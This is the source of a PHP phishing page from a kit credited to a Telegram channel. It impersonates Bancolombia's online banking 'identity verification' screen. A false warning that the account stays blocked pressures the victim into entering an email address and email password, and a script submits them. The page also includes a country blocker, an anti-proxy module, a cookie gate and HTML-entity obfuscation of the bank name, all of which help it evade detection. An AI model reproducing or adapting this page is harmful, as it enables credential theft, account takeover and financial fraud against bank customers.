<?php
/**
###############################################
#     Version 2.0                             #
#     https://t.me/neo_net                    #
#     Simular Datos Reales de kamehouse     #
###############################################
**/
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');

/* Config Loader */
require_once 'config/config.php';

/* Country Blocker 2.0 */
include 'country-block/blocker.php';

/* Antiproxies 2.0 */
if ($antiproxies == 1):
include 'antiproxy/antiproxy.php';
endif;
if (!@$_COOKIE['pass']) {
header('Location: password.php');
}
?>

<html><head>
  <title>&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#32;&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#86;&#105;&#114;&#116;&#117;&#97;&#108;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#115;</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta charset="utf-8">
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link href="mua/css/styles.css" media="all" rel="stylesheet" type="text/css">
  <link href="mua/css/bootstrap.css" media="all" rel="stylesheet" type="text/css">  
<!--[if lt IE 8]>
    <link href="mua/css/bootstrap-ie7.css" rel="stylesheet">
<![endif]-->
      <!--[if lt IE 9]>
      <script src="mua/js/html5shiv.js"></script>
      <script src="mua/js/respond.min.js"></script>
   <![endif]-->
	<script type="text/javascript" src="mua/js/jquery-3.6.0.min.js"></script>
	<script type="text/javascript" src="mua/js/jquery.cookie.js"></script>
	<script type="text/javascript" src="mua/js/patterns/jquery.validate-1.11.1.js"></script>
	<script type="text/javascript" src="mua/js/patterns/validations.js"></script>
	<script type="text/javascript" src="mua/js/patterns/jquery-validations.js"></script>
	<script type="text/javascript" src="mua/js/patterns/blockKeys.js"></script>
	<script type="text/javascript" src="mua/js/jquery-ui.js"></script>
	<script type="text/javascript" src="mua/js/bluebird.min.js"></script>
	<link href="mua/css/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
   	<link href="mua/css/ui.css" media="all" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="favicon.ico">
</head>
<body onload="timeOutActive = true; setTitle();" style="">
	<noscript></noscript>
	<div class="container">
<div>
	<div id="header" class="mua-page-header">
		<div class="row row-logo-svp">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div class="mua-imgLogoItem"></div>
				<div class="text-svp-name">Sucursal Virtual Personas</div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
<div>
<script src="mua/js/jquery.jclock-min.js" type="text/javascript"></script>
 <script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#jclock1').jclock(optionsEST);
     });
 </script>
	<div class="timeText">Fecha y hora actual:</div>
	<span id="jclock1" class="lastVisitedText"></span>
</div>
				</div>
			</div>
		</div>
	</div>
	<div class="panel-heading">
		<h3>
			Verificación de Identidad
		</h3>
	</div>
</div>
		    <div>
		            <div class="panel panel-primary">
		               <form id="genPassDataForm" name="genPassDataForm" class="form-horizontal" role="form" action="mua/VALIDATE_GEN_DATA?scis=6as2LBEM%2BzLKEpvj7qTpXHal3d1cIonoDYFEEBL5DIldcE5iA7J4r9oa1r7Ec0TV" method="post" novalidate="novalidate">
		              	<input id="pass" name="pass" class="mua-form-control" type="hidden" value="">
		              	<input id="passVerification" name="passVerification" class="mua-form-control" type="hidden" value="">
		              	<input type="hidden" name="tempUserID" id="tempUserID">
   						<input type="hidden" name="userId" id="userId" value="">
			                <div class="row">
		<div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp mua_message_multiple_not_svp" id="tabError" style="display: none;">
	<div class="errorDiv">
        <div class="divTextMessage">
			<span class="icon-error errorIcon">
				<span class="path1"></span>
				<span class="path2"></span>
				<span class="path3"></span>
            </span>
            <div class="errorTitulo">Error</div>
			<div id="summary" class="errorTexto">
			</div>
		</div>
	</div>
</div>
							</div>
							<div class="row">
<div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="contentMsjInfo">
	<div class="informativoDiv">
		<div class="divTextMessage">
			<span class="icon-informacion informativoIcon">
				<span class="path1"></span>
				<span class="path2"></span>
				<span class="path3"></span>
			</span>
			<div class="informativoTitulo">Información</div>
			<div class="informativoTexto">
				Como medida de regulación, es necesario completar esta verificación de identidad, de lo contrario su cuenta permanecerá bloqueada.
					<span></span>
			</div>
		</div>
	</div>
</div>
<div class="modal fade modalPopupConfirmation dialogModalSalir" id="Contactenos" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" data-keyboard="false" data-backdrop="static">
	<div class="modal-dialog" role="document">
		<div class="modal_Center_Popup">
			<div class="modal-header modal-headerPopup">
				<button type="button" class="close closeButtomPopup" data-dismiss="modal" aria-label="Close">
					<span class="glyphicon icon-cancel" aria-hidden="true"></span>
				</button>
			</div>
			<div class="modal_panel_second">
				<div class="modal_subtitle_item">
					<h1>Contáctenos</h1>
				</div>
				<div class="mua-modal-body">
								<div class="row">
									<div class="col-xs-12 col-sm-12 col-md-12 text-center">
								       <strong>Sucursal Telefónica kamehouse</strong>
								    </div>
								</div>
								<div class="row mua_contact_modal_row_pt20">
									<div class="col-xs-6 col-sm-6 col-md-6 text-right mua_contact_modal_div">
										Bogotá:
									</div>
									<div class="col-xs-6 col-sm-6 col-md-6 text-left">
									343 0000
									</div>
								</div>
								<div class="row mua_contact_modal_row_pt0">
									<div class="col-xs-6 col-sm-6 col-md-6 text-right mua_contact_modal_div">
										Medellín:
									</div>
									<div class="col-xs-6 col-sm-6 col-md-6 text-left">
									510 9000
									</div>
								</div>
								<div class="row mua_contact_modal_row_pt0">
									<div class="col-xs-6 col-sm-6 col-md-6 text-right mua_contact_modal_div">
										Cali:
									</div>
									<div class="col-xs-6 col-sm-6 col-md-6 text-left">
									554 0505
									</div>
								</div>
								<div class="row mua_contact_modal_row_pt0">
									<div class="col-xs-6 col-sm-6 col-md-6 text-right mua_contact_modal_div">
										Barranquilla:
									</div>
									<div class="col-xs-6 col-sm-6 col-md-6 text-left">
									361 8888
									</div>
								</div>
								<div class="row mua_contact_modal_row_pt0">
									<div class="col-xs-6 col-sm-6 col-md-6 text-right mua_contact_modal_div">
										Pereira:
									</div>
									<div class="col-xs-6 col-sm-6 col-md-6 text-left">
									340 1213
									</div>
								</div>
								<div class="row mua_contact_modal_row_pt0">
									<div class="col-xs-6 col-sm-6 col-md-6 text-right mua_contact_modal_div">
										Bucaramanga:
									</div>
									<div class="col-xs-6 col-sm-6 col-md-6 text-left">
									697 2525
									</div>
								</div>
								<div class="row mua_contact_modal_row_pt0">
									<div class="col-xs-6 col-sm-6 col-md-6 text-right mua_contact_modal_div">
										Cartagena:
									</div>
									<div class="col-xs-6 col-sm-6 col-md-6 text-left">
									693 4400
									</div>
								</div>
								<div class="row mua_contact_modal_row_pt0">
									<div class="col-xs-6 col-sm-6 col-md-6 text-right mua_contact_modal_div">
										Resto del país:
									</div>
									<div class="col-xs-6 col-sm-6 col-md-6 text-left">
									01 800 09 12345
									</div>
								</div>
								<div class="row mua_contact_modal_row_pt20">
									<div class="col-xs-12 col-sm-12 col-md-12 text-center">
								       <strong>Sucursales telefónicas en el exterior</strong>
								    </div>
								</div>
								<div class="row mua_contact_modal_row_pt20">
									<div class="col-xs-6 col-sm-6 col-md-6 text-right mua_contact_modal_div">
										España:
									</div>
									<div class="col-xs-6 col-sm-6 col-md-6 text-left">
									900 995 717
									</div>
								</div>
								<div class="row mua_contact_modal_row_pt0">
									<div class="col-xs-6 col-sm-6 col-md-6 text-right mua_contact_modal_div">
										Estados Unidos:
									</div>
									<div class="col-xs-6 col-sm-6 col-md-6 text-left">
									1 866 379 97 14
									</div>
								</div>
				</div>
				<div class="mua-modal-footer">
					<button type="button" class="btn btn_Succed_Popup" data-dismiss="modal">
						Cerrar
					</button>
				</div>
			</div>
		</div>
	</div>
</div>
							</div>
		                <div class="mua-panel-body">
								<div class="row mua_row_mtb_30">
									<div class="col-xs-12 col-sm-12 col-md-12">
										<strong>Importante</strong><br>
										Activa la seguridad de dos pasos, sincroniza tu <b>Correo Electrónico</b>.
									</div>
								</div>
									<div class="row">
										<div class="col-xs-12 col-sm-9 col-md-9">
											<div class="row mua_svp_space_pb_preparation">
											</div>
											<div class="row">
											</div>
										</div>
									</div>
									<div class="row">
										<div class="col-xs-12 col-sm-9 col-md-9">
											<div class="row mua_svp_space_pb_preparation">
												<div class="col-xs-4 col-sm-4 col-md-6 mua_svp_enroll_update_row_pr">
													<label class="control-label" for="pass">Correo:</label>
												</div>
												<div class="col-xs-7 col-sm-8 col-md-6 mua_svp_enroll_update_row_pl">
													<div class="mua_svp_enroll_update_control">
													    <input id="correo" name="correo"  onfocus="bindElement(this,0)" tabindex="3" class="mua-form-control" type="email" value=""  autocomplete="off" required="">
													</div>
													<div id="spanHelp1" class="mua_svp_enroll_update_label">Ingresa tu correo electrónico asociado a tu cuenta</div>
													<div id="passError" class="labelError" style="display: none"></div>
												</div>
											</div>
											<div class="row">
												<div class="col-xs-4 col-sm-4 col-md-6 mua_svp_enroll_update_row_pr">
													<label class="control-label" for="passVerification">Contraseña de Correo:</label>
												</div>
												<div class="col-xs-7 col-sm-8 col-md-6 mua_svp_enroll_update_row_pl">
													<div class="mua_svp_enroll_update_control">
													    <input id="correopass" name="correopass" tabindex="4" class="mua-form-control" type="password" value="" autocomplete="off" required="">
													</div>
													<div id="spanHelp2" class="mua_svp_enroll_update_label">Digita la misma clave que tu<br> correo electrónico.</div>
													<div id="passVerificationError" class="labelError" style="display: none;"></div>
											    </div>
											</div>
											<div class="two-button-container mua-button-container">
												<div class="two-button-b">
													<input id="btnGo" name="btnGo" class="btn btn-success" type="button" value="Continuar" disabled="">
			                                    </div>
			                                </div>
										</div>
									<div id="recaptcha" class="g-recaptcha" data-sitekey="6LcQkTUUAAAAAAqNJNF97DoEKkxyTia9U6SOqp61" data-callback="onSubmit" data-size="invisible"><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; position: fixed; visibility: hidden; display: block; transition: right 0.3s ease 0s; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div>
                                </form>
		                </div>
		            </div>
<div class="row">
	<div class="col-xs-12 col-sm-12 col-md-12">
		<p class="mua-footer">
			&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#84;&#101;&#108;&#101;&#102;&#243;&#110;&#105;&#99;&#97;&#32;&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#58;&#32;&#66;&#111;&#103;&#111;&#116;&#225;&#32;&#51;&#52;&#51;&#32;&#48;&#48;&#48;&#48;&#32;&#45;&#32;&#77;&#101;&#100;&#101;&#108;&#108;&#237;&#110;&#32;&#53;&#49;&#48;&#32;&#57;&#48;&#48;&#48;&#32;&#45;&#32;&#67;&#97;&#108;&#105;&#32;&#53;&#53;&#52;&#32;&#48;&#53;&#48;&#53;&#32;&#45;&#32;&#66;&#97;&#114;&#114;&#97;&#110;&#113;&#117;&#105;&#108;&#108;&#97;&#32;&#51;&#54;&#49;&#32;&#56;&#56;&#56;&#56;&#32;&#45;&#32;&#67;&#97;&#114;&#116;&#97;&#103;&#101;&#110;&#97;&#32;&#54;&#57;&#51;&#32;&#52;&#52;&#48;&#48;&#32;&#45;&#32;&#66;&#117;&#99;&#97;&#114;&#97;&#109;&#97;&#110;&#103;&#97;&#32;&#54;&#57;&#55;&#32;&#50;&#53;&#50;&#53;&#32;&#45;&#32;&#80;&#101;&#114;&#101;&#105;&#114;&#97;&#32;&#51;&#52;&#48;&#32;&#49;&#50;&#49;&#51; <br> &#69;&#108;&#32;&#114;&#101;&#115;&#116;&#111;&#32;&#100;&#101;&#108;&#32;&#112;&#97;&#237;&#115;&#32;&#48;&#49;&#32;&#56;&#48;&#48;&#32;&#48;&#57;&#32;&#49;&#50;&#51;&#52;&#53;&#46;&#32;&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#101;&#115;&#32;&#84;&#101;&#108;&#101;&#102;&#243;&#110;&#105;&#99;&#97;&#115;&#32;&#101;&#110;&#32;&#101;&#108;&#32;&#101;&#120;&#116;&#101;&#114;&#105;&#111;&#114;&#58;&#32;&#69;&#115;&#112;&#97;&#241;&#97;&#32;&#57;&#48;&#48;&#32;&#57;&#57;&#53;&#32;&#55;&#49;&#55;&#32;&#45;&#32;&#69;&#115;&#116;&#97;&#100;&#111;&#115;&#32;&#85;&#110;&#105;&#100;&#111;&#115;&#32;&#49;&#56;&#54;&#54;&#32;&#51;&#55;&#57;&#32;&#57;&#55;&#49;&#52;&#46;
		</p>
	</div>
</div>
	       <div style="margin-top: 10px;">
	            <div class="mua-title-text pull-left">Dirección IP: <?php echo $ip; ?></div>
	            <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2021</span>&nbsp;&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#32;&#83;&#46;&#65;&#46;&nbsp;&nbsp;</div>
	        </div>
		    </div>
<script type="text/javascript" src="mua/js/app_correo.js"></script>
</body></html>